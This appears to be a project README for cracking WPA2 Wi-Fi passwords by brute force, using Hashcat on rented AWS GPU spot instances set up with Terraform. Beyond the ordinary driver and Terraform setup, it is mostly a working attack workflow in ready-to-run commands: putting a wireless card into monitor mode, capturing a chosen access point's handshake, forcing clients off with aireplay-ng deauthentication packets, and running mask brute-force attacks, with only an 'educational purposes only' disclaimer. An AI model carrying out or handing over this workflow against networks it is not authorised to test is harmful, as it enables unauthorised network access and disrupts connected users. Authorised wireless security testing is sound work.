# AWS & HashCat

A AWS &amp; Hashcat environment for WPA2 Brute force attack (educational purposes only).

## Introduction

One big question when it comes to breaking passwords by brute force is: How long will it take?

While the password  **112233** would only take 1 second to be discovered through trial and error, consisting of several combinations, a password like **fDb#E!*##12c** would take 4 centuries, according to [Kaspersky Calculator](https://password.kaspersky.com/?/utm_medium=rdr&utm_source=redirector&utm_campaign=old_url). The problem is that it is not enough to have a "Gamer" computer, it will not be enough if the password is a bit more complex, we often have even modest computers.

An alternative is to use **AWS** to accomplish this task, there are very powerful **EC2** instances in which we can enjoy paying for hours of use.

We can use instances of type P3 for example, which contains the following configuration:

Name | GPUs | GPU Mem | vCPU | Mem (GiB) | Cost/hour 
-----|------|---------|------|-----------|----------
p3.2xlarge | 1 | 16 | 4 | 61 | $ 3.06 
p3.8xlarge | 8 | 64 | 32 | 244 | $ 12.24
p3.16xlarge | 8 | 128 | 64 | 488 | $ 24.48
p3dn.24xlarge | 8 | 256 | 96 | 768 | $ 31.218
p4d.24xlarge | 8 | not specified | 96 | 1152 | $ 32.77

You can be able to save up to 70% by using spot instance.

## Prerequisites

To perform this process you must have the following requirements:

* Knowledge of Linux
* Account with AWS
* Be willing to spend

## Configuration

With the pre requisites fulfilled hands down.

### Uploading Instance

1. Select the AMI Debian 10
1. Choose the type, in this example I'll use **p3.2xlarge**
1. Configure the details, storage, security group, key pair, etc.
1. After creating the instance make the connection via SSH

At this point we will do the initial configuration.

### Configuration

Update and upgrade apt

```
sudo apt update && sudo apt upgrade -y
```

Install the packages

```
sudo apt install -y --ignore-missing build-essential tmux htop vim jq unzip lsof git p7zip-full
```

Set the correct timezone

```
ln -sf /usr/share/zoneinfo/America/Sao_Paulo /etc/localtime
```

Create the file **blacklist-nouveau.conf**

```
sudo vim /etc/modprobe.d/blacklist-nouveau.conf
```

Enter the following lines

```
nouveau blacklist
blacklist lbm-nouveau
options nouveau modeset = 0
alias nouveau off
alias lbm-nouveau off
```

Create the file **nouveau-kms.conf**

```
sudo vim /etc/modprobe.d/nouveau-kms.conf
```
Enter the following line

```
options nouveau modeset = 0
```

And then upgrade initramfs

```
sudo update-initramfs -u
```

At this point reboot your server to continue
```
reboot
```

Install linux headers
```
sudo apt install -y linux-headers-`uname -r`
```

Download NVIDIA drivers and install

```
cd /tmp/
wget https://us.download.nvidia.com/tesla/470.57.02/NVIDIA-Linux-x86_64-470.57.02.run
sudo /bin/bash NVIDIA-Linux-x86_64-470.57.02.run --ui=none --no-questions --silent -X

```

Download HashCat and install

```
cd /tmp/
wget https://hashcat.net/files/hashcat-6.2.4.7z >/dev/null 2>&1
7za x hashcat-6.2.4.7z >/dev/null 2>&1
mv hashcat-6.2.4 /home/admin/
ln -s /home/admin/hashcat-6.2.4/hashcat.bin /usr/local/bin/hashcat
```

At this point you can put your **.hc22000** files on the server, if you have captured the handshake through **Aircrack-ng** you can convert the file **.cap** to **.hc22000** without much trouble, a very simple alternative is to use a tool called [cap2hashcat](https://hashcat.net/cap2hashcat/) from HashCat itself.

Now just launch the command and wait for the password to be discovered, for more information on usage consult HashCat [Documentation](https://hashcat.net/wiki/).

## Using Aircrack-ng to get handshake

Install aircrack-ng
```
sudo apt install aircrack-ng
```

Put the interface into monitoring mode
```
sudo airmon-ng start wlan0
```

If the interface is busy
```
sudo airmon-ng check kill
```

check candidates
```
sudo airodump-ng wlan0mon
```

Once chosen stop it and start capture
```
sudo airodump-ng -c CHANNEL --bssid MAC -w /tmp/wificapfile wlan0mon
```

To make faster the capture, you can force the reauthentication
```
sudo aireplay-ng -0 2 -a MAC -c MAC wlan0mon
```

Little explanation
```
-0 2: number of requests
-a: access point MAC address
-c: client MAC address
```

You will see in the top right corner when the handshake is captured, then stop the capture and convert the file using **cap2hashcat** tool.

## Terraform project

You must have the following packages

* aws-cli
* terraform


Configure the aws credentials
```
aws configure
```

Init Terraform

```
terraform init
```

Apply
```
terraform apply
```

At this point all the environment and spot instance machine will be created, and the **initial-script.sh** located in scripts folder will be automatically launched, once finished reboot the server.
```
reboot
```

Then run **hashcat.sh** to install nvidia drivers and hashcat.
```
/home/admin/hashcat.sh
```

## How to use Hashcat

There is some example bellow, you can consult the official documentation as well.

Send the file to the server
```
scp -i aws-hcat-prod.pem wificapfile.hc22000 admin@<IP ADDRESS>:/home/admin/
```

Hashcat brute force examples
```
hashcat -m 22000 wificapfile.hc22000 -a 3 ?d?d?d?d?d?d?d?d
hashcat wificapfile.hc22000 -m 22000 -a 3 ?H?H?H?HHELLOWORLD
```
